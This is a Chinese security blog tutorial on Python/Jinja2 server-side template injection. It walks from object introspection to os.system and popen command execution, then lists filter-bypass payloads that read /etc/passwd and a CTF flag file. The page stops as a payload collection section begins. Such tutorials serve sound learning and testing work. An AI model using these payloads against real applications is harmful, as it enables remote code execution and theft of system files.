<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="ssti漏洞成因SSTI全称是服务端模板注入攻击(Server-Side Template Injection)，众所周知，很多web开发框架使用模板的来提高开发效率，但是也因此造成了一些安全问题，由于配置代码不规范或信任了用户输入的数据导致模板可控甚至RCE。 前置知识在Python的ssti中，大部分是根据 基类–&gt;子类–&gt;危险函数 的过程来利用ssti。首先介绍一些特殊的属性、方">
<meta property="og:type" content="article">
<meta property="og:title" content="Python 模板注入(SSTI) 初探">
<meta property="og:url" content="http://startpwn.top/2020/05/04/ssti-learn/index.html">
<meta property="og:site_name" content="Sp4rta&#39;s blog">
<meta property="og:description" content="ssti漏洞成因SSTI全称是服务端模板注入攻击(Server-Side Template Injection)，众所周知，很多web开发框架使用模板的来提高开发效率，但是也因此造成了一些安全问题，由于配置代码不规范或信任了用户输入的数据导致模板可控甚至RCE。 前置知识在Python的ssti中，大部分是根据 基类–&gt;子类–&gt;危险函数 的过程来利用ssti。首先介绍一些特殊的属性、方">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-05-04T10:08:53.000Z">
<meta property="article:modified_time" content="2021-11-05T09:47:15.697Z">
<meta property="article:author" content="ssta">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Python 模板注入(SSTI) 初探</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/Links/">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/05/06/linux-kernel-basics/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/04/28/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://startpwn.top/2020/05/04/ssti-learn/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://startpwn.top/2020/05/04/ssti-learn/&text=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://startpwn.top/2020/05/04/ssti-learn/&is_video=false&description=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Python 模板注入(SSTI) 初探&body=Check out this article: http://startpwn.top/2020/05/04/ssti-learn/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://startpwn.top/2020/05/04/ssti-learn/&name=Python 模板注入(SSTI) 初探&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://startpwn.top/2020/05/04/ssti-learn/&t=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti漏洞成因"><span class="toc-number">1.</span> <span class="toc-text">ssti漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#前置知识"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti-利用过程"><span class="toc-number">3.</span> <span class="toc-text">ssti 利用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-收集"><span class="toc-number">5.</span> <span class="toc-text">payload 收集</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Python 模板注入(SSTI) 初探
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Sp4rta's blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-05-04T10:08:53.000Z" itemprop="datePublished">2020-05-04</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/web/" rel="tag">web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h3><p>SSTI全称是服务端模板注入攻击(Server-Side Template Injection)，众所周知，很多web开发框架使用模板的来提高开发效率，但是也因此造成了一些安全问题，由于配置代码不规范或信任了用户输入的数据导致模板可控甚至RCE。</p>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>在Python的ssti中，大部分是根据 基类–&gt;子类–&gt;危险函数 的过程来利用ssti。<br>首先介绍一些特殊的属性、方法：<br><code>__bases__</code>：Python 为所有类都提供了一个 <code>__bases__</code>属性，通过该属性可以查看该类的所有基类，该属性返回所有基类组成的元组。注：类的实例是没有<code>__bases__</code>属性的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [20]: class Class:</span><br><span class="line">    ...:     def init(self):</span><br><span class="line">    ...:         print(&quot;123&quot;)</span><br><span class="line">    ...:</span><br><span class="line">    </span><br><span class="line">In [23]: Class.__bases__</span><br><span class="line">Out[23]: (object,)</span><br></pre></td></tr></table></figure>

<p><code>__base__</code>：以字符串的形式返回一个类的基类。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: <span class="class"><span class="keyword">class</span> <span class="title">Class</span>:</span></span><br><span class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    ...:         print(<span class="string">"123"</span>)</span><br><span class="line">    ...:</span><br><span class="line">    </span><br><span class="line">In [<span class="number">49</span>]: Class.__bases__</span><br><span class="line">Out[<span class="number">49</span>]: (object,)</span><br><span class="line"></span><br><span class="line">In [<span class="number">50</span>]: Class.__base__</span><br><span class="line">Out[<span class="number">50</span>]: object</span><br></pre></td></tr></table></figure>

<p><code>__class__</code>：Python中一切皆对象，<code>__class__</code>属性用于返回该对象所属的类，实例通过类属性就可以调用类的方法。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">34</span>]: <span class="string">""</span>.__class__</span><br><span class="line">Out[<span class="number">34</span>]: str</span><br><span class="line"></span><br><span class="line">In [<span class="number">35</span>]: [].__class__</span><br><span class="line">Out[<span class="number">35</span>]: list</span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: ().__class__</span><br><span class="line">Out[<span class="number">36</span>]: tuple</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: <span class="class"><span class="keyword">class</span> <span class="title">Class</span>:</span></span><br><span class="line">    ...:     <span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    ...:         print(<span class="string">"123"</span>)</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: b = Class()</span><br><span class="line"></span><br><span class="line">In [<span class="number">31</span>]: b.__class__.init()</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>

<p><code>__mro__</code>：Python 类有多继承特性，如果继承关系太复杂，很难看出会先调用那个属性或方法。为了方便且快速地看清继承关系和顺序，可以用<code>__mro__</code>方法来获取这个类的调用顺序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [56]: Class.__class__.__mro__</span><br><span class="line">Out[56]: (type, object)</span><br><span class="line"></span><br><span class="line">In [57]: b.__class__.__mro__</span><br><span class="line">Out[57]: (__main__.Class, object)</span><br></pre></td></tr></table></figure>

<p><code>__subclasses__()</code> : 函数获取类的所有子类。（返回一个列表）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: <span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">Out[<span class="number">5</span>]:</span><br><span class="line">[type,</span><br><span class="line"> weakref,</span><br><span class="line"> weakcallableproxy,</span><br><span class="line"> weakproxy,</span><br><span class="line"> int,</span><br><span class="line"> bytearray,</span><br><span class="line"> bytes,</span><br><span class="line"> list,</span><br><span class="line"> NoneType,</span><br><span class="line"> NotImplementedType,</span><br><span class="line"> traceback,</span><br><span class="line"> super,</span><br><span class="line"> range,</span><br><span class="line"> dict,</span><br><span class="line"> ···</span><br></pre></td></tr></table></figure>

<p><code>__init__</code>: 此方法为类的初始化方法。当构造函数被调用的时候的任何参数都将会传给它。(比如如果我们调用 <code>x = SomeClass(10, &#39;foo&#39;)</code>)，那么 <code>__init__</code> 将会得到两个参数10和foo。所有自带类都包含<code>__init__</code>方法，可以利用他当跳板来调用<code>__globals__</code>。</p>
<p><code>__globals__</code>: 对保存函数的全局变量的字典的引用——定义函数的模块的全局命名空间。常用于获取function所处空间下可使用的module、方法以及所有变量。 </p>
<p><code>__getitem__</code>: 使用索引访问元素，通常用于过滤<code>[]</code>的情况。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">35</span>]: <span class="string">'123abc'</span>.__getitem__(<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">35</span>]: <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: <span class="string">'123abc'</span>.__getitem__(<span class="number">2</span>)</span><br><span class="line">Out[<span class="number">36</span>]: <span class="string">'3'</span></span><br></pre></td></tr></table></figure>

<p>过waf时还可能会用到<code>__getattribute__</code>、<code>__builtins__</code>、<code>__import__</code>。</p>
<h3 id="ssti-利用过程"><a href="#ssti-利用过程" class="headerlink" title="ssti 利用过程"></a>ssti 利用过程</h3><p>通常，存在模板注入的地方都是可以直接输出的位置，可以传入<code>56</code> 这种表达式，来查看输出时括号中内容是否执行。当然最终的目的肯定是RCE或者ORW。</p>
<p>第一步当然是想办法找到超类<code>object</code>，这里我以字符串变量为例：先是利用<code>__class__</code>找到字符串所属的类str，然后再利用<code>__bases__</code>或者<code>__mro__</code>来找到str的基类也就是<code>object</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">37</span>]: <span class="string">"ssti"</span>.__class__</span><br><span class="line">Out[<span class="number">37</span>]: str</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: <span class="string">"ssti"</span>.__class__.__bases__</span><br><span class="line">Out[<span class="number">38</span>]: (object,)</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: <span class="string">"ssti"</span>.__class__.__mro__</span><br><span class="line">Out[<span class="number">40</span>]: (str, object)</span><br></pre></td></tr></table></figure>

<p>接下来获取<code>object</code>类的所有子类，找到能够读些文件或者执行系统命令的类。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: <span class="string">"ssti"</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">Out[<span class="number">43</span>]:</span><br><span class="line">[type,</span><br><span class="line"> weakref,</span><br><span class="line"> weakcallableproxy,</span><br><span class="line"> weakproxy,</span><br><span class="line"> int,</span><br><span class="line"> bytearray,</span><br><span class="line"> bytes,</span><br><span class="line"> list,</span><br><span class="line"> NoneType,</span><br><span class="line"> NotImplementedType,</span><br><span class="line"> traceback,</span><br><span class="line"> super,</span><br><span class="line"> range,</span><br><span class="line"> dict,</span><br><span class="line"> dict_keys,</span><br><span class="line"> dict_values,</span><br><span class="line"> dict_items,</span><br><span class="line"> odict_iterator,</span><br><span class="line">··· 略</span><br></pre></td></tr></table></figure>

<p>子类数量比较多，在这里我写一个小脚本来帮助我们寻找可用的类。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lst &#x3D; &quot;ssti&quot;.__class__.__bases__[0].__subclasses__()</span><br><span class="line"></span><br><span class="line">for i in range(0,len(lst)):</span><br><span class="line">	if &#39;os&#39; in str(lst[i]):</span><br><span class="line">		print(i,lst[i])</span><br><span class="line">		</span><br><span class="line"># </span><br><span class="line"># 99 &lt;class &#39;posix.ScandirIterator&#39;&gt;</span><br><span class="line"># 100 &lt;class &#39;posix.DirEntry&#39;&gt;</span><br><span class="line"># 127 &lt;class &#39;os._wrap_close&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>找到os的索引是127之后我们再次利用<code>__init__.__globals__</code>来寻找是否存在可利用的函数或者模块，一般情况下这个输出内容较多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">46</span>]: <span class="string">"ssti"</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__</span><br><span class="line">Out[<span class="number">46</span>]:</span><br><span class="line">&#123;<span class="string">'__name__'</span>: <span class="string">'os'</span>,</span><br><span class="line"> <span class="string">'__doc__'</span>: <span class="string">"OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either 'posix' or 'nt'\n  - os.curdir is a string representing the current directory (always '.')\n  - os.pardir is a string representing the parent directory (always '..')\n  - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n  - os.extsep is the extension separator (always '.')\n  - os.altsep is the alternate pathname separator (None or '/')\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files ('\\r' or '\\n' or '\\r\\n')\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n"</span>,</span><br><span class="line"> <span class="string">'__package__'</span>: <span class="string">''</span>,</span><br><span class="line"> ··· 略</span><br></pre></td></tr></table></figure>

<p>在这里我发现了可以直接调用system函数来执行命令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">51</span>]: <span class="string">"ssti"</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">"system"</span>]</span><br><span class="line">Out[<span class="number">51</span>]: &lt;function posix.system(command)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: <span class="string">"ssti"</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">"system"</span>](<span class="string">"whoami"</span>)</span><br><span class="line">root</span><br><span class="line">Out[<span class="number">52</span>]: <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>或利用popen：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">57</span>]: <span class="string">"ssti"</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">"popen"</span>](<span class="string">"whoami"</span>).read()</span><br><span class="line">Out[<span class="number">57</span>]: <span class="string">'root\n'</span></span><br></pre></td></tr></table></figure>

<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p>
<p>过滤中括号 []<br>使用<code>__getitem__</code> 来绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">61</span>]: <span class="string">"ssti"</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">127</span>).__init__.__globals__[<span class="string">"popen"</span>](<span class="string">"whoami"</span>).read()</span><br><span class="line">Out[<span class="number">61</span>]: <span class="string">'root\n'</span></span><br></pre></td></tr></table></figure>

<p>过滤引号</p>
<p>可用jinjia2中默认存在的对象request来绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__[request.args.arg1]&#125;&#125;&amp;arg1=os</span><br></pre></td></tr></table></figure>

<p>还可以利用chr函数，步骤是获取chr函数然后赋值给chr，下面就可以直接调用了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">116</span>)%<span class="number">2</span>bchr(<span class="number">99</span>)%<span class="number">2</span>bchr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>过滤双下划线</p>
<p>也可以利用request</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<p>关键字过滤</p>
<p>可用字符串拼接或者字符串内置的方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">70</span>]: <span class="string">"ssti"</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">127</span>).__init__.__globals__[<span class="string">"sys"</span>+<span class="string">"tem"</span>]</span><br><span class="line">Out[<span class="number">70</span>]: &lt;function posix.system(command)&gt;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request[&#39;__cl&#39;+&#39;ass__&#39;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#39;__cla&#39;+&#39;ss__&#39;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>字符串内置方法，如replace、decode等等。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__getslice__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'_formatter_field_name_split'</span>, <span class="string">'_formatter_parser'</span>, <span class="string">'capitalize'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'decode'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isdigit'</span>, <span class="string">'islower'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">72</span>]: <span class="string">"ssti"</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">127</span>).__init__.__globals__[<span class="string">"123tem"</span>.replace(<span class="string">'123'</span>,<span class="string">'sys'</span>)]</span><br><span class="line">Out[<span class="number">72</span>]: &lt;function posix.system(command)&gt;</span><br></pre></td></tr></table></figure>
<p>同时绕过下划线、与中括号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)|attr(request.values.name5)()&#125;&#125;</span><br><span class="line">post:</span><br><span class="line">name1&#x3D;__class__&amp;name2&#x3D;__base__&amp;name3&#x3D;__subclasses__&amp;name4&#x3D;pop&amp;name5&#x3D;read</span><br></pre></td></tr></table></figure>



<h3 id="payload-收集"><a href="#payload-收集" class="headerlink" title="payload 收集"></a>payload 收集</h3><p>获取基类object</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">8</span>]</span><br></pre></td></tr></table></figure>

<p>文件操作</p>
